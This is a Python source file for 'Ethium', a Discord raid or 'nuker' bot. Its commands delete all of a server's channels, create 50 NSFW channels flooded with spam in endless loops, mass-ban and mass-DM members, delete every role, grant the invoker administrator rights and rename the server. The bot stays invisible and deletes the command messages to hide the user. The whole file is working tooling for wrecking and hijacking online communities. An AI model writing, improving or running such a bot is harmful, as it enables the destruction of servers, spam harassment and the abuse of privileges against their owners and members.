import asyncio
import json
import logging as log
import os
import sys
from datetime import datetime as dt
from threading import Thread
from typing import Callable, Dict, List, Optional, Union

import discord
import httpx
import inquirer
from discord.ext import commands as cmds
from rgbprint import Color, gradient_print

cls: Callable[[], None] = lambda: os.system('cls || clear')


def get_config() -> Dict[str, str]:
    '''
    The get_config function reads the config.json file and returns a dictionary of the configuration values.

    :return: A dictionary with the configuration.
    '''
    try:
        with open('../config/config.json', 'r', encoding='utf8') as file:
            data = json.load(file)

        return data
    except Exception as e:
        log.error(f'An error occurred while obtaining the configuration {e}')


def append_data(info: Dict[str, str]) -> None:
    '''
    The append_data function takes in a dictionary and appends it to the config.json file.

    :param info: Used to Append data to the config.
    :return: None.
    '''
    try:
        with open('../config/config.json', 'w', encoding='utf8') as file:
            json.dump(info, file, indent=4)
    except Exception as e:
        log.error(f'An error occurred while adding information to the config file {e}')


def rewrite_config() -> Dict[str, str]:
    '''
    The rewrite_config function is used to rewrite the config file.
    It is called when the user enters 'rewrite' as an argument in the command line.
    The function asks for confirmation from the user before rewriting, and if confirmed, it will delete all data in
    the config file and then call prompt() to ask for new input.

    :return: None.
    '''
    CHOICES: List[str] = ['YES', 'NO']
    QUESTIONS: List[inquirer.List] = [
        inquirer.List('config', 'Rewrite config', choices=CHOICES),
    ]

    try:
        answers: Dict[str, str] = inquirer.prompt(QUESTIONS)
    except Exception as e:
        log.error(f'An error occurred while making the prompt {e}')
    if answers['config'] == 'YES':
        data = get_config()
        for line in data:
            del line

        config = prompt()
        return config
    return get_config()


def prompt() -> Dict[str, str]:
    '''
    The prompt function is used to prompt the user for input.
        It uses inquirer to ask the user questions and return a dictionary of answers.

    :return: A dictionary.
    '''
    QUESTIONS: List[inquirer.Text] = [
        inquirer.Text('Token', 'Set the bot token'),
        inquirer.Text('Prefix', 'Set the prefix'),
        inquirer.Text('ServerName', 'Enter the server name'),
        inquirer.Text('ServerIcon', 'Set the server icon url'),
        inquirer.Text('ChannelsName', 'Set the channels name'),
        inquirer.Text('RolesName', 'Set the roles name'),
        inquirer.Text('SpamMsg', 'Enter the message to spam'),
    ]
    try:
        answers = inquirer.prompt(QUESTIONS)
        if not answers:
            raise ValueError('Invalid data')

        append_data(answers)
        return answers
    except Exception as e:
        log.error(f'An error occurred while making the prompt {e}')


config = rewrite_config() if get_config() else prompt()

token: str = config['Token']
prefix: str = config['Prefix']
server_name: str = config['ServerName']
server_icon: str = config['ServerIcon']
channels_name: str = config['ChannelsName']
roles_name: str = config['RolesName']
spam_msg: str = config['SpamMsg']

ethium: cmds.Bot = cmds.Bot(
    command_prefix=prefix,
    help_command=None,
    intents=discord.Intents.all(),
)


async def banner() -> None:
    '''
    The banner function is a coroutine that prints the bot's banner to the console.
    It also logs some useful information about the bot, such as its name, commands and prefix.

    :return: None.
    '''
    BANNER: str = '''
▄███▄     ▄▄▄▄▀ ▄  █ ▄█   ▄   █▀▄▀█ 
█▀   ▀ ▀▀▀ █   █   █ ██    █  █ █ █ 
██▄▄       █   ██▀▀█ ██ █   █ █ ▄ █ 
█▄   ▄▀   █    █   █ ▐█ █   █ █   █ 
▀███▀    ▀        █   ▐ █▄ ▄█    █  
                 ▀       ▀▀▀    ▀
    '''
    _dev: discord.User = await ethium.fetch_user(843511119033401394)
    CMDS: str = ' ~ '.join([cmd.name for cmd in ethium.commands])
    cls()
    gradient_print(BANNER, start_color=Color.thistle, end_color=Color.white_smoke)
    log.info(f'Logged in as {ethium.user}')
    log.info(f'Commands: {CMDS}')
    log.info(f'prefix: {ethium.command_prefix}')
    log.info(f'Coded by {_dev}\n')


@ethium.event
async def on_ready() -> None:
    '''
    The on_ready function is called when the bot is ready to start interacting with Discord.
    This function is a coroutine, and it should be treated as such.
    It will print out some information about the bot, including its name and ID.

    :return: None.
    '''
    status: discord.Status = discord.Status.invisible
    try:
        await ethium.change_presence(status=status)
        await banner()

    except Exception as e:
        log.error(f'An error occurred while changing the status {e}')


@ethium.event
async def on_command(ctx: cmds.Context) -> None:
    '''
    The on_command function is a coroutine that is called whenever a command is executed.
    It logs the command and author to the console, then deletes the message.

    :param ctx:cmds.Context: Used to Pass the context of the command to.
    :return: None.
    '''
    cmd: Optional[cmds.Command] = ctx.command
    author: Union[discord.User, discord.Member] = ctx.author
    log.info(f'Command {cmd} executed by {author}')
    try:
        await ctx.message.delete()
    except Exception as e:
        log.error(f'An error occurred while deleting the message {e}')


@ethium.event
async def on_command_error(
    ctx: cmds.Context, exception: Union[cmds.CommandError, Exception]
) -> None:
    '''
    The on_command_error function is a coroutine that is called when an error occurs while invoking a command.
    The event name is on_command_error.
    This function takes two parameters: the Command object and the exception raised. The exception will be of type Exception, or subclass thereof.

    :param _: Used to Represent the bot object.
    :param exception:Union[cmds.CommandError: Used to Catch any errors that are raised by the command.
    :param Exception]: Used to Catch any exception that may occur.
    :return: None.
    '''
    exception = getattr(exception, 'original', exception)
    if isinstance(exception, cmds.CommandOnCooldown):
        try:
            await ctx.send(f'> {ctx.author.mention} command has cooldown, try after.')
        except Exception as e:
            log.error(f'An error occurred while sending the message {e}')
    log.error(exception)


@ethium.event
async def on_command_completion(ctx: cmds.Context) -> None:
    '''
    The on_command_completion function is a coroutine that is called when a command finishes executing.
    It prints the banner to the console.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    await banner()


@ethium.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
    '''
    The on_guild_channel_create function is a coroutine that is called when a channel is created in the guild.
    It checks if the channel's position is 0, and if it isn't, it sends spam_msg to the channel.

    :param channel:discord.abc.GuildChannel: Used to Store the channel that was created.
    :return: None.
    '''
    if channel.position == 0:
        return

    while True:
        try:
            await channel.send(spam_msg)
            log.info(f'Spammed channel {channel}')

        except Exception as e:
            log.error(f'An error occurred while spamming the message {e}')


@ethium.command(
    description='This command allows you to delete all channels from the server.'
)
async def nuke(ctx: cmds.Context) -> None:
    '''
    The nuke function is a command that deletes all channels in the guild,
    and then creates a new channel with the name specified by channels_name.
    It also sends spam_msg to this newly created channel.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    _URL: str = 'https://discord.com/api/v10/channels/%s'
    _HEADERS: Dict[str, str] = {'Authorization': f'Bot {token}'}

    async def del_channel(channel_id: int) -> None:
        async with httpx.AsyncClient() as client:
            await client.delete(_URL % channel_id, headers=_HEADERS)

    for channel in guild.channels:
        Thread(target=asyncio.run, args=(del_channel(channel.id),)).start()
        log.info(f'Deleted channel {channel}')

    channel: discord.TextChannel = await guild.create_text_channel(channels_name)
    await channel.send(spam_msg)


@ethium.command(
    description='This command will allow you to create 50 channels with undefined ping on each channel (cooldown of 10 min).'
)
@cmds.cooldown(1, 600)
async def raid(ctx: cmds.Context) -> None:
    '''
    The raid function is a command that will change the server name and icon to
    the values defined in the constants at the top of this file. It will then create
    50 text channels with names defined by channels_name.

    :param ctx:cmds.Context: Used to Get the guild that the command was used in.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    _response: httpx.Response = httpx.get(server_icon)
    guild_icon: bytes = _response.content
    await guild.edit(name=server_name, icon=guild_icon)
    for _ in range(50):
        channel: discord.TextChannel = await guild.create_text_channel(
            channels_name, nsfw=True
        )
        log.info(f'Created channel {channel}')


@ethium.command(
    name='on',
    description='This command is used to make the automatic raid by deleting channels and creating new ones with spam.',
)
async def start(ctx: cmds.Context) -> None:
    '''
    The start function is a command that will start the raid.
    It does this by first nuking all channels, then creating new ones.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None
    '''
    await nuke(ctx)
    await raid(ctx)


@ethium.command(
    name='massban',
    description='This command will ban all server members with a lower role than the bot.',
)
async def mass_ban(ctx: cmds.Context) -> None:
    '''
    The mass_ban function is a command that will ban every member in the guild
    except for the author and bot.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    bot_member: Optional[discord.Member] = guild.get_member(ethium.user.id)
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:

        if member.top_role.position < bot_member.top_role.position:
            continue

        await guild.ban(member)
        log.info(f'Executed member {member}')


@ethium.command(
    name='admin',
    description='This command will create a role with administrator permission and assign it to you.',
)
async def get_admin(ctx: cmds.Context) -> None:
    '''
    The get_admin function is a command that allows the user to get admin
    permissions on the server.

    :param ctx:cmds.Context: Used to Pass the context of the command.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    author: Union[discord.User, discord.Member] = ctx.author
    role: discord.Role = await guild.create_role(
        name=prefix, permissions=discord.Permissions().all()
    )
    await author.add_roles(role)
    log.info(f'Role added {role} to {author}')


@ethium.command(
    name='massdm', description='This command will spam the DM of all server members.'
)
async def mass_dm(ctx: cmds.Context) -> None:
    '''
    The mass_dm function is a command that sends the spam_msg to every member of
    the guild except for the author and Ethium.

    :param ctx:cmds.Context: Used to Get the guild, author and bot.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for member in [
        member for member in guild.members if not member in (ctx.author, ethium.user)
    ]:
        channel: discord.DMChannel = await member.create_dm()
        await channel.send(spam_msg)
        log.info(f'Spammed DM {channel}')


@ethium.command(
    name='delroles', description='This command will remove all roles from the server.'
)
async def del_roles(ctx: cmds.Context) -> None:
    '''
    The del_roles function deletes all roles in a guild except for the @everyone role.

    Parameters:

        ctx (cmds.Context): The context of the command that was invoked, which contains information about the message and channel it was sent from, as well as other useful information such as who sent it and what guild they are in.

    :param ctx:cmds.Context: Used to Get the guild object.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for role in [role for role in guild.roles if role.name != 'everyone']:
        await role.delete()
        log.info(f'Deleted role {role}')


@ethium.command(
    name='mkroles',
    description='This command will create the number of roles that are missing to reach 250 roles (the maximum).',
)
async def make_roles(ctx: cmds.Context) -> None:
    '''
    The make_roles function creates 250 roles in the guild.

    The make_roles function is used to create 250 roles in the guild, which are then used by the bot to assign a role for each user that joins. The name of these roles is 'User'. This function should only be called once per server, as it will not check if there are already enough roles created before creating more.

    :param ctx:cmds.Context: Used to Get the guild from the context.
    :return: None.
    '''
    guild: discord.Guild = ctx.guild
    for _ in range(250 - len(guild.roles)):
        role: discord.Role = await guild.create_role(name=roles_name)
        log.info(f'Created role {role}')


@ethium.command(
    description='This command shows you the help, the list of commands and their respective uses.'
)
async def help(ctx: cmds.Context) -> None:
    '''
    The help function is a command that displays all of the available commands
    that Ethium has to offer. It also includes a description for each command, as well
    as the prefix used by Ethium.

    :param ctx:cmds.Context: Used to Get the context of the command.
    :return: None.
    '''
    author: Union[discord.User, discord.Member] = ctx.author
    _dev: discord.User = await ethium.fetch_user(843511119033401394)
    embed: discord.Embed = discord.Embed(
        title='Ethium | Commands',
        description=f'Below is a list of my available **commands**.\n> My prefix is: **{ethium.command_prefix}**',
        color=0x000,
        url='https://angits.github.io/',
        timestamp=dt.utcnow(),
    )

    embed.set_author(name=_dev, icon_url=_dev.avatar)
    embed.set_thumbnail(url=ethium.user.avatar)
    embed.set_footer(text=author.name, icon_url=author.avatar)

    for cmd in ethium.commands:
        embed.add_field(
            name=cmd.name,
            value=f'```fix\n{cmd.description}```',
            inline=False,
        )

    await ctx.send(embed=embed)


if __name__ == '__main__':
    log.basicConfig(
        level=log.INFO,
        format=f'{Color.thistle}[%(asctime)s] - {Color.white_smoke}%(message)s',
        datefmt='%I:%M:%S',
    )
    try:
        ethium.run(token)
    except Exception as e:
        log.error(f'An error occurred while logging into the client {e}')
        sys.exit()
